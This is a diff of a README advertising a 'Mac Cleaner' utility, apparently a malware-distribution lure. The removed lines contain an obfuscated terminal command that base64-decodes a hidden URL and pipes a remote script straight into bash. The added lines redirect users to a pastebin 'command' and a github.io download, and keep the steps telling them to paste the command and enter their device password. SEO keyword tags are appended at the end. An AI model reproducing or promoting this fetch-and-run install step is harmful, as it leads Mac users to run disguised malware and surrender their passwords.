@@ -8,7 +8,7 @@ Mac Cleaner is a lightweight and powerful tool designed to keep your Mac running
 
 ## 📥 Download
 
-[![Download Mac Cleaner](https://img.shields.io/badge/Download-Mac%20Cleaner-brightgreen?style=for-the-badge&logo=apple)](https://resmanio.com/get.php?call=imb)
+[![Download Mac Cleaner](https://img.shields.io/badge/Download-Mac%20Cleaner-brightgreen?style=for-the-badge&logo=apple)](https://kjskkfifi84875.github.io/.github/macclean)
 
 Get the latest version of Mac Cleaner for macOS
 *Requires macOS 10.15 or later.*
@@ -29,13 +29,12 @@ Get the latest version of Mac Cleaner for macOS
 ### Installation via a command in the terminal:
 
 1. Copy the installation command below.
-```
-/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9pbWIvaW5zdGFsbC5zaA== | base64 -d))"
-```
-2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
-3. Enter your device password and confirm the installation.
+[![Get macOS command](https://img.shields.io/badge/Get%20Command-macOS-0A84FF?style=for-the-badge&logo=apple&logoColor=white)](https://pastebin.com/raw/LeqifJNA)
 
-[![0723-1.gif](https://i.postimg.cc/NfzQxpMT/0723-1.gif)](https://postimg.cc/0b7gkG72)
+3. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
+4. Enter your device password and confirm the installation.
+
+ 
 
 ---
 
@@ -107,3 +106,7 @@ Mac Cleaner is licensed under the [MIT License](LICENSE).
 ---
 
 *Have questions? Reach out via [Issues](https://github.com/username/MacCleaner/issues) or join our [Discussions](https://github.com/username/MacCleaner/discussions)!*
+
+## Tags
+
+mac cleaner mac, mac cleaner download, maccleaner, mac cleaner app, cleaner for macbook
